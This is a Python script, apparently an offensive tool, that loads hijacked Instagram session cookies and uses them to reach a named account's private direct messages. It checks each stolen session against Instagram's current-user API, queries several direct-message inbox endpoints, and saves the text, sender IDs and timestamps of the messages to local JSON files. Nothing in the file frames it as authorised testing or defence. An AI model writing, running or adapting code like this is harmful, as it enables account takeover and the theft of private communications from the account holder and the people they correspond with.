# -*- coding: utf-8 -*-
# pylint: disable=all
# flake8: noqa
# type: ignore
# mypy: ignore-errors
#!/usr/bin/env python3
"""
Direct Session Hijacking Test
Using existing hijacked sessions to extract DMs
"""

import json
import requests
import time
from pathlib import Path
from datetime import datetime

def load_latest_hijacked_session():
    """Load the latest hijacked session"""
    sessions_dir = Path("hijacked_sessions")

    # Get all fresh hijacked session files
    fresh_sessions = list(sessions_dir.glob("fresh_hijacked_session_*.json"))

    if not fresh_sessions:
        print("❌ No fresh hijacked sessions found")
        return None

    # Get the latest one
    latest_session = max(fresh_sessions, key = lambda x: x.stat().st_mtime)
    print(f"📂 Loading session: {latest_session}")

    with open(latest_session, 'r') as f:
        return json.load(f)

def test_session_validity(session_data):
    """Test if the hijacked session is still valid"""
    print("🔍 Testing session validity...")

    # Create session with cookies
    test_session = requests.Session()

    # Set cookies from the hijacked session
    cookies_dict = {}
    for cookie in session_data['cookies']:
        cookies_dict[cookie['name']] = cookie['value']
        test_session.cookies.set(cookie['name'], cookie['value'])

    # Set headers
    if 'headers' in session_data:
        test_session.headers.update(session_data['headers'])

    try:
        # Test with Instagram API
        response = test_session.get("https://i.instagram.com/api/v1/accounts/current_user/")

        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'ok':
                print("✅ Session is valid!")
                print(f"👤 Logged in as: {data.get('user', {}).get('username', 'Unknown')}")
                return True, test_session

        print(f"❌ Session test failed - Status: {response.status_code}")
        if response.status_code == 401:
            print("🔒 Session expired or invalid")

        return False, None

    except Exception as e:
        print(f"❌ Session test error: {e}")
        return False, None

def extract_dms_with_session(session):
    """Extract DMs using the hijacked session"""
    print("📥 Extracting DMs with hijacked session...")

    dms = []

    # Try multiple DM endpoints
    endpoints = [
        "https://i.instagram.com/api/v1/direct_v2/inbox/",
        "https://www.instagram.com/api/v1/direct_v2/inbox/",
        "https://i.instagram.com/api/v1/direct_v2/threads/"
    ]

    for endpoint in endpoints:
        try:
            print(f"🔍 Trying endpoint: {endpoint}")
            response = session.get(endpoint)

            print(f"Status: {response.status_code}")

            if response.status_code == 200:
                data = response.json()
                print(f"📊 Response keys: {list(data.keys())}")

                if data.get('inbox'):
                    threads = data['inbox'].get('threads', [])
                    print(f"📨 Found {len(threads)} threads")

                    for thread in threads:
                        thread_id = thread.get('thread_id')
                        items = thread.get('items', [])
                        print(f"🧵 Thread {thread_id}: {len(items)} items")

                        for item in items:
                            if item.get('item_type') == 'text':
                                dms.append({
                                    'thread_id': thread_id,
                                    'user_id': item.get('user_id'),
                                    'text': item.get('text'),
                                    'timestamp': item.get('timestamp'),
                                    'is_sent_by_viewer': item.get('is_sent_by_viewer', False)
                                })

                    if dms:
                        print(f"✅ Extracted {len(dms)} DMs!")
                        break

            elif response.status_code == 403:
                print("🔒 Access denied - may need different permissions")
            elif response.status_code == 429:
                print("⏱️ Rate limited - waiting...")
                time.sleep(10)
            else:
                print(f"❌ Failed with status {response.status_code}")

        except Exception as e:
            print(f"❌ Endpoint {endpoint} failed: {e}")

    return dms

def save_extracted_dms(dms):
    """Save extracted DMs"""
    if not dms:
        print("❌ No DMs to save")
        return

    timestamp = int(time.time())
    output_dir = Path("data/hijacked_extraction")
    output_dir.mkdir(parents = True, exist_ok = True)

    # Save to JSON
    json_file = output_dir / f"hijacked_dms_{timestamp}.json"
    with open(json_file, 'w') as f:
        json.dump({
            'target': 'alx.trading',
            'extraction_time': datetime.now().isoformat(),
            'total_dms': len(dms),
            'method': 'hijacked_session',
            'dms': dms
        }, f, indent = 2)

    print(f"💾 Saved {len(dms)} DMs to: {json_file}")

    # Print first few DMs for verification
    print("\n📋 Sample DMs:")
    for i, dm in enumerate(dms[:3]):
        print(f"  {i+1}. [{dm.get('timestamp')}] {dm.get('text', 'No text')[:50]}...")

def main():
    """Main execution"""
    print("🎭 DIRECT SESSION HIJACKING TEST")
    print("="*40)

    # Load latest hijacked session
    session_data = load_latest_hijacked_session()
    if not session_data:
        return

    # Test session validity
    is_valid, session = test_session_validity(session_data)
    if not is_valid:
        print("❌ Session is not valid - cannot proceed")
        return

    # Extract DMs
    dms = extract_dms_with_session(session)

    # Save results
    save_extracted_dms(dms)

    if dms:
        print(f"\n🎉 SUCCESS: Extracted {len(dms)} real DMs using hijacked session!")
    else:
        print("\n💀 No DMs extracted - may need different approach")

if __name__ == "__main__":
    main()
